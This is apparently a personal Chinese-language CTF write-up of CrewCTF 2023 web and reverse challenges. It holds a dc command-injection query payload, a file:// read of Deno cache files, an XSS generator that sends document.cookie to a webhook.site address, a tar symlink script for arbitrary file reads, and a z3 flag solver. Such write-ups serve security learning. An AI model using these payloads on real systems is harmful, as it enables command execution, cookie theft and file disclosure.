# web
### sequence_gallery
#命令注入 
```python
def index():
	sequence = request.args.get('sequence', None)
	if sequence is None:
		return render_template('index.html')

	script_file = os.path.basename(sequence + '.dc')
	if ' ' in script_file or 'flag' in script_file:
		return ':('

	proc = subprocess.run(
		['dc', script_file], 
		capture_output=True,
		text=True,
		timeout=1,
	)
	output = proc.stdout

	return render_template('index.html', output=output)
```
感觉像命令注入,但是`os.path.basename`限制了目录穿越
> Usage: dc [OPTION] [file ...]
-e, --expression=EXPR evaluate expression
-f, --file=FILE evaluate contents of file
-h, --help display this help and exit
-V, --version output version information and exit

可以使用-e参数执行命令,[参考](https://www.ibm.com/docs/en/aix/7.2?topic=d-dc-command) 
> !	Interprets the rest of the line as an operating system command.

*payload*
%09绕过空格,;来排除.dc的影响
```shell
?sequence=--expression=!%09cat%09fl*;
```
### safe_proxy
[wp](https://untrue.me/writeups/crewctf2023/safe-proxy/)
```js
app.use((ctx) => {
  const params = helpers.getQuery(ctx);
  if (!params.token) return;

  const token = params.token;
  if (token === PROVIDER_TOKEN) {
    ctx.response.body = `export const FLAG = '${FLAG}';`;
  };
});
```
flag需要得知正确的PROVIDER_TOKEN
```js
  .get('/proxy', async (ctx) => {
    const params = helpers.getQuery(ctx);

    if (!params.url) {
      ctx.response.body = 'missing url';
      return;
    }

    const url = params.url;
    const fetchResponse = await fetch(url);
    ctx.response.body = fetchResponse.body;
  })
```
但是现在主机和token都不知道,访问`127.0.0.1`都是500
![image](https://i.imgur.com/1W7rm53.png)

可以访问本机服务`0.0.0.0:8080`
但是还是不知道怎么ssrf

--- 
根据wp是通过伪协议LFI读取缓存文件,wp中采用本地搭建docker来发现flag缓存文件的路径

> $DENO_DIR/deps is used to store files fetched through remote url import. It contains subfolders based on url scheme (currently only http and https), and store files to locations based on the URL path

最终路径:`/home/app/.cache/deno/deps/http/safe-proxy-flag-provider_PORT8082/70ec621b0141f80c80d9e26b084da38df4bbf6b4b64d04c837f7b3cd5fe8482b`

---
offical wp
读取缓存文件`file:///home/app/.cache/deno/dep_analysis_cache_v1`,存储的是deno运行时的模块依赖分析文件,是一个sqlite db文件
我们使用[sqlite-view](https://inloop.github.io/sqlite-viewer/)打开,
![image](https://i.imgur.com/ugLU8l8.png)
而deno会根据此生成一个缓存文件,路径为`$DENO_DIR/deps/http/<domain>_PORT<port>/sha256(path部分除了domain,port)
即`/home/app/.cache/deno/deps/http/safe-proxy-flag-provider_PORT8082/{cache_hash}`
### hex2dec
#xss 
一个hex转dec的网站
![image](https://i.imgur.com/hkm83Xl.png)
这真就一点不会,这玩意怎么xss

---
dinner正则写错了
![image](https://i.imgur.com/DAygaDd.png)
所以可以直接使用标签,害我看了我半天
官方脚本
```python
def gen_str(s):
    chars = []
    for c in s:
        if c.islower():
            idx = ord(c) - ord("a")
            chars.append(f"X[{idx}]")
        elif c == "`":
            chars.append(f"`\\``")
        elif c == "\\":
            chars.append(f"`\\\\`")
        else:
            chars.append(f"`{c}`")
    return "+".join(chars)

def gen_unicode_str(s):
    return "".join([f"\\u{ord(c):04X}" for c in s])

webhook = "https://webhook.site/b847bcd2-a4a3-4797-b518-7b33b3ef2012"

payload = "<A ID=A HREF=ABCDEFGHIJKLMNOPQRSTUVWXYZ:>"
payload += "<IMG SRC ONERROR="
payload += "X=A+``;"
payload += f"HREF={gen_str('href')};"
payload += f"CLICK={gen_str('click')};"
payload += f"COOKIE={gen_str('cookie')};"
payload += f"A[HREF]={gen_str(f'javascript:location[HREF]=`{gen_unicode_str(webhook)}`+document[COOKIE]')};"
payload += f"A[CLICK]``;"
payload += ">"

print(payload)
```
构造的原生payload
```html
<A ID=A HREF=ABCDEFGHIJKLMNOPQRSTUVWXYZ:>
<IMG SRC ONERROR=X=A+``;HREF=href;CLICK=click;COOKIE=cookie;A[HREF]=javascript:location[HREF]=https://webhook.site/b847bcd2-a4a3-4797-b518-7b33b3ef2012?+document.cookie;A[CLICK]``;>
```
ONERROR里的操作相当于修改A的属性,在执行X=A+\`\`后,X=*abcdefghijklmnopqrstuvwxyz:* 
根据wp里,是通过`use HTMLAnchorElement.toString to get lowercase characters`
,`[HREF]=>.href`,然后执行点击事件

### archive_stat_viewer
#zip

可以上传文件,存在解压方法,猜测上传软链接,试了好几个,结果只支持tar和gz
```python
@app.get('/results/<archive_id>')
def download_result(archive_id):
	if 'archives' not in session:
		session['archives'] = []
	archive_id = Path(archive_id).name
	return send_file(UPLOAD_DIR / archive_id / 'result.json')
```
可以上传软连接覆盖result.json来读取文件
步骤:上传任意一个gz文件,获取它的`<archive_id>`,然后上传一个恶意软连接zip文件,覆盖它的result.json,再访问就可以读取flag
*生成脚本*
```python
import tarfile

with tarfile.open('exploit.tar.gz', 'w:gz') as tar:
    # First file
    info1 = tarfile.TarInfo("./test.txt")
    info1.type = tarfile.SYMTYPE
    info1.linkname = "/" 
    tar.addfile(info1)

    # Second file
    info2 = tarfile.TarInfo("./test.txt/web-apps/src/archives/c7e24804-b1a0-4d25-af1f-10b998083453/result.json")
    info2.type = tarfile.SYMTYPE
    info2.linkname = "/web-apps/src/flag.txt" # or /
    tar.addfile(info2)
```


# reverse
### ez-rev

使用z3模块求解的脚本
```python
from z3 import *
s = Solver()

flag = [BitVec(f"flag[{i}]",8) for i in range(0x100)]
tmp = []
t = 0x69
for i in range(len(flag)):
    t = (flag[i]+i)^t
    tmp.append(t)
t = 0x96
for i in range(1,len(flag)):
    tmp[i] = ((tmp[i-1] - tmp[i]) ^ t)&0xff
    t = tmp[i]
enc = bytes.fromhex("0a07ee64058ef6943d85178411691c8902751f8c01830b85169a0e8c0084038517b30f9f3ce417b7609537f9d5af46a243b15aa07c62f96b06ad1dc93ef3e49332c31ea10ac31cd330d33cd03ece8bdf32c209cf81cd89c9f33295c480ba99e910e009dd3039743e655f3a2010c42c0812c824dc58736b5454736f2cf033d374bc33b73ca8d3fb34a4d3ff2ca0d3e354cc53c75cf8334b54f4334f6cd073b3349cf397fc88d39bf484d39fec80d383d4ec53e75c98f3abd494f3")

for i in range(len(enc)):
    s.add(enc[i] == tmp[i])
print(s.check())
m = s.model()
for d in m.decls():
    print("%s = %s"%(d.name(),m[d]))
flag = [0]*0x100
flag[5] = 116
flag[42] = 110
flag[175] = 0
flag[137] = 0
flag[34] = 98
flag[118] = 0
flag[65] = 114
flag[54] = 99
flag[23] = 111
flag[31] = 97
flag[38] = 111
flag[177] = 0
flag[55] = 105
flag[0] = 99
flag[120] = 0
flag[128] = 0
flag[62] = 111
flag[13] = 105
flag[180] = 0
flag[44] = 120
flag[25] = 95
flag[28] = 112
flag[50] = 101
flag[57] = 108
flag[27] = 111
flag[71] = 98
flag[33] = 95
flag[133] = 0
flag[158] = 0
flag[169] = 0
flag[115] = 125
flag[184] = 0
flag[140] = 0
flag[91] = 116
flag[24] = 119
flag[106] = 103
flag[59] = 121
flag[74] = 95
flag[170] = 0
flag[160] = 0
flag[49] = 95
flag[147] = 0
flag[69] = 114
flag[80] = 117
flag[93] = 105
flag[68] = 101
flag[97] = 111
flag[30] = 99
flag[101] = 114
flag[32] = 110
flag[4] = 99
flag[58] = 108
flag[10] = 108
flag[63] = 114
flag[159] = 0
flag[26] = 114
flag[168] = 0
flag[45] = 105
flag[29] = 95
flag[72] = 117
flag[64] = 95
flag[179] = 0
flag[99] = 95
flag[47] = 117
flag[108] = 100
flag[129] = 0
flag[119] = 0
flag[2] = 101
flag[39] = 95
flag[139] = 0
flag[11] = 108
flag[8] = 119
flag[149] = 0
flag[35] = 101
flag[3] = 119
flag[142] = 0
flag[131] = 0
flag[60] = 95
flag[178] = 0
flag[19] = 116
flag[22] = 110
flag[40] = 111
flag[113] = 101
flag[95] = 95
flag[121] = 0
flag[96] = 121
flag[134] = 0
flag[136] = 0
flag[141] = 0
flag[67] = 118
flag[145] = 0
flag[150] = 0
flag[73] = 116
flag[83] = 97
flag[151] = 0
flag[155] = 0
flag[172] = 0
flag[174] = 0
flag[14] = 95
flag[103] = 95
flag[132] = 0
flag[138] = 0
flag[163] = 0
flag[36] = 95
flag[78] = 121
flag[37] = 115
flag[109] = 95
flag[153] = 0
flag[107] = 111
flag[76] = 102
flag[125] = 0
flag[53] = 101
flag[85] = 95
flag[51] = 115
flag[173] = 0
flag[176] = 0
flag[181] = 0
flag[182] = 0
flag[18] = 110
flag[16] = 105
flag[104] = 97
flag[123] = 0
flag[61] = 102
flag[43] = 111
flag[126] = 0
flag[185] = 0
flag[6] = 102
flag[90] = 95
flag[148] = 0
flag[165] = 0
flag[48] = 115
flag[117] = 0
flag[164] = 0
flag[114] = 114
flag[98] = 117
flag[77] = 95
flag[79] = 111
flag[84] = 110
flag[88] = 110
flag[105] = 95
flag[122] = 0
flag[127] = 0
flag[111] = 101
flag[156] = 0
flag[81] = 95
flag[166] = 0
flag[21] = 107
flag[161] = 0
flag[183] = 0
flag[86] = 102
flag[171] = 0
flag[20] = 95
flag[87] = 105
flag[92] = 104
flag[46] = 111
flag[146] = 0
flag[12] = 95
flag[167] = 0
flag[157] = 0
flag[52] = 112
flag[56] = 97
flag[102] = 101
flag[130] = 0
flag[152] = 0
flag[89] = 100
flag[41] = 98
flag[162] = 0
flag[110] = 114
flag[144] = 0
flag[7] = 123
flag[17] = 100
flag[66] = 101
flag[82] = 99
flag[100] = 97
flag[1] = 114
flag[75] = 105
flag[116] = 0
flag[94] = 115
flag[124] = 0
flag[135] = 0
flag[143] = 0
flag[112] = 118
flag[9] = 101
flag[15] = 100
flag[70] = 95
flag[154] = 0

print(bytes(flag))
```
# pwn

# crypto

# Misc


---
# *相关wp*
[offical](https://discord.com/channels/959047109015904306/1127643056666067084)



2023-07-08   17:47